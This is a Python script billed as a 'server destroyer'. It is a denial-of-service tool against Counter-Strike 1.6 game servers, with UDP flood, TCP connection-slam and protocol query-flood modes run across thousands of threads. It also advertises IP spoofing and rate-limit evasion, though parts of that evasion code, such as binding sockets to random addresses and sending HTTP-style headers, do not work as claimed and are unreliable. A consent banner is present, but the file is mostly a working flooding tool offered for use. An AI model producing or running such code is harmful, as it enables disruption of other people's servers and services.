#!/usr/bin/env python3
"""
CS 1.6 ULTIMATE SERVER DESTROYER - HYPER EDITION
Author: Anonymous
Description: Nuclear-grade stress testing tool with advanced bypass techniques
"""

import sys
import os
import time
import random
import socket
import threading
import argparse
import select
import struct
import zlib
import hashlib
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import cpu_count, Manager
from datetime import datetime
from fake_useragent import UserAgent

# ========================
# GLOBAL CONFIGURATION
# ========================
VERSION = "2.0-HYPER"
MAX_THREADS = 5000  # Extreme thread count
CONNECTION_TIMEOUT = 3  # Aggressive timeout
DEFAULT_PORT = 27015  # CS 1.6 default port
DEBUG_MODE = False  # Debug output
IP_SPOOFING = True  # Enabled by default
USE_TOR = False  # Tor network routing
CONNECTION_LIFETIME = 30  # Max connection duration

# Protocol constants
A2S_INFO = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
A2S_PLAYER = b"\xFF\xFF\xFF\xFFT\x11"
A2S_RULES = b"\xFF\xFF\xFF\xFFT\x12"
A2S_CHALLENGE = b"\xFF\xFF\xFF\xFFT\x57"

# ========================
# HYPER EVASION TECHNIQUES
# ========================
class HyperEvasion:
    """Advanced anti-DDoS and rate limit bypass techniques"""
    
    @staticmethod
    def get_spoofed_headers():
        """Generate spoofed HTTP-like headers"""
        return {
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            'User-Agent': UserAgent().random,
            'Accept': '*/*',
            'Connection': 'keep-alive' if random.choice([True, False]) else 'close'
        }
    
    @staticmethod
    def get_tor_proxy():
        """Get Tor proxy configuration"""
        return {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
    
    @staticmethod
    def random_delay():
        """Random delay to bypass rate limiting"""
        return random.uniform(0.001, 0.01)  # Extremely short delays

# ========================
# NUCLEAR PAYLOAD ENGINE
# ========================
class NuclearPayloads:
    """Ultimate payload generation with evasion"""
    
    @staticmethod
    def generate_flood_packet():
        """Generate high-intensity flood packet"""
        base = random.choice([
            b"\xFF\xFF\xFF\xFF\x55",  # Connection
            b"\xFF\xFF\xFF\xFF\x42",  # Events
            b"\xFF\xFF\xFF\xFF\x43"   # Updates
        ])
        return base + os.urandom(random.randint(512, 1024))  # Large packets
    
    @staticmethod
    def generate_challenge_chain():
        """Generate challenge/response chain"""
        challenge = struct.pack("<i", random.randint(1, 1000000))
        return [
            A2S_CHALLENGE,
            A2S_PLAYER + challenge,
            A2S_RULES + challenge,
            A2S_INFO
        ]

# ========================
# HYPER ATTACK METHODS
# ========================
class HyperAttacks:
    """Extreme-intensity attack methods"""
    
    @staticmethod
    def udp_hyper_flood(target_ip, target_port, stats):
        """UDP flood with maximum intensity"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(CONNECTION_TIMEOUT)
        
        try:
            while True:
                try:
                    # Spoof source if enabled
                    if IP_SPOOFING:
                        sock.bind((HyperEvasion.get_spoofed_headers()['X-Forwarded-For'], 
                                 random.randint(1024, 65535)))
                    
                    # Send barrage of packets
                    for _ in range(50):  # Packet burst
                        sock.sendto(NuclearPayloads.generate_flood_packet(), 
                                   (target_ip, target_port))
                        stats['sent'] = stats.get('sent', 0) + 1
                    
                    time.sleep(HyperEvasion.random_delay())
                except Exception as e:
                    stats['errors'] = stats.get('errors', 0) + 1
                    if DEBUG_MODE:
                        print(f"[UDP Error] {str(e)[:50]}")
        finally:
            sock.close()
    
    @staticmethod
    def tcp_slam(target_ip, target_port, stats):
        """TCP connection slam with keepalive abuse"""
        while True:
            try:
                # Create multiple sockets rapidly
                sockets = []
                for _ in range(20):  # Connection burst
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(CONNECTION_TIMEOUT)
                        s.connect((target_ip, target_port))
                        sockets.append(s)
                        stats['conns'] = stats.get('conns', 0) + 1
                    except:
                        stats['errors'] = stats.get('errors', 0) + 1
                
                # Send data through all connections
                for s in sockets:
                    try:
                        s.send(NuclearPayloads.generate_flood_packet())
                        stats['sent'] = stats.get('sent', 0) + 1
                    except:
                        stats['errors'] = stats.get('errors', 0) + 1
                
                # Keep connections alive for maximum impact
                time.sleep(random.uniform(0.1, 0.5))
                
            except Exception as e:
                stats['errors'] = stats.get('errors', 0) + 1
                if DEBUG_MODE:
                    print(f"[TCP Error] {str(e)[:50]}")
            finally:
                for s in sockets:
                    try:
                        s.close()
                    except:
                        pass
    
    @staticmethod
    def protocol_exploit(target_ip, target_port, stats):
        """Engine protocol exploitation"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        
        try:
            while True:
                try:
                    # Send challenge chain repeatedly
                    for packet in NuclearPayloads.generate_challenge_chain():
                        sock.sendto(packet, (target_ip, target_port))
                        stats['sent'] = stats.get('sent', 0) + 1
                        time.sleep(0.01)
                    
                    # Random additional packets
                    for _ in range(random.randint(5, 15)):
                        sock.sendto(NuclearPayloads.generate_flood_packet(),
                                   (target_ip, target_port))
                        stats['sent'] = stats.get('sent', 0) + 1
                    
                    time.sleep(HyperEvasion.random_delay())
                except Exception as e:
                    stats['errors'] = stats.get('errors', 0) + 1
                    if DEBUG_MODE:
                        print(f"[Exploit Error] {str(e)[:50]}")
        finally:
            sock.close()

# ========================
# MAIN CONTROLLER
# ========================
class ServerDestroyer:
    """Main attack controller"""
    
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.manager = Manager()
        self.stats = self.manager.dict({
            'start_time': time.time(),
            'sent': 0,
            'conns': 0,
            'errors': 0
        })
    
    def launch_attack(self, method='udp', threads=MAX_THREADS):
        """Launch the selected attack method"""
        print(f"\n[!] INITIATING HYPER ATTACK ON {self.target_ip}:{self.target_port}")
        print(f"[!] METHOD: {method.upper()} | THREADS: {threads}")
        print("[!] PRESS CTRL+C TO TERMINATE\n")
        
        attack_method = {
            'udp': HyperAttacks.udp_hyper_flood,
            'tcp': HyperAttacks.tcp_slam,
            'exploit': HyperAttacks.protocol_exploit
        }.get(method, HyperAttacks.udp_hyper_flood)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack_method, 
                                     self.target_ip, 
                                     self.target_port, 
                                     self.stats) 
                      for _ in range(threads)]
            
            try:
                # Real-time stats display
                while True:
                    self.show_stats()
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Terminating attack...")
                for future in futures:
                    future.cancel()
    
    def show_stats(self):
        """Display current attack statistics"""
        elapsed = time.time() - self.stats['start_time']
        print(f"\n[STATS] Packets: {self.stats.get('sent', 0):,} | "
              f"Conns: {self.stats.get('conns', 0):,} | "
              f"Errors: {self.stats.get('errors', 0):,} | "
              f"Elapsed: {elapsed:.1f}s")

# ========================
# COMMAND LINE INTERFACE
# ========================
def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description=f"CS 1.6 Server Destroyer v{VERSION}")
    parser.add_argument('ip', help="Target server IP")
    parser.add_argument('-p', '--port', type=int, default=DEFAULT_PORT,
                       help="Target port")
    parser.add_argument('-m', '--method', default='udp',
                       choices=['udp', 'tcp', 'exploit'],
                       help="Attack method")
    parser.add_argument('-t', '--threads', type=int, default=MAX_THREADS,
                       help="Attack threads")
    parser.add_argument('--debug', action='store_true',
                       help="Enable debug")
    parser.add_argument('--no-spoof', action='store_false',
                       dest='spoof', help="Disable IP spoofing")
    return parser.parse_args()

def validate_ip(ip):
    """Validate target IP"""
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False

def main():
    """Main execution"""
    args = parse_args()
    
    if not validate_ip(args.ip):
        print("Invalid IP address!")
        return
    
    global IP_SPOOFING, DEBUG_MODE
    IP_SPOOFING = args.spoof
    DEBUG_MODE = args.debug
    
    print("\n" + "="*60)
    print(f"CS 1.6 SERVER DESTROYER v{VERSION}")
    print("="*60)
    print("WARNING: THIS TOOL IS FOR LEGAL STRESS TESTING ONLY")
    print("UNAUTHORIZED USE IS ILLEGAL AND PROHIBITED")
    print("="*60 + "\n")
    
    if input("Confirm you have permission to test (y/n): ").lower() != 'y':
        print("Aborted.")
        return
    
    # Launch attack
    destroyer = ServerDestroyer(args.ip, args.port)
    try:
        destroyer.launch_attack(method=args.method, threads=args.threads)
    except KeyboardInterrupt:
        print("\nAttack terminated.")
    except Exception as e:
        print(f"\nCritical error: {e}")

if __name__ == "__main__":
    if IP_SPOOFING and os.geteuid() != 0:
        print("Root required for IP spoofing!")
        sys.exit(1)
    
    main()
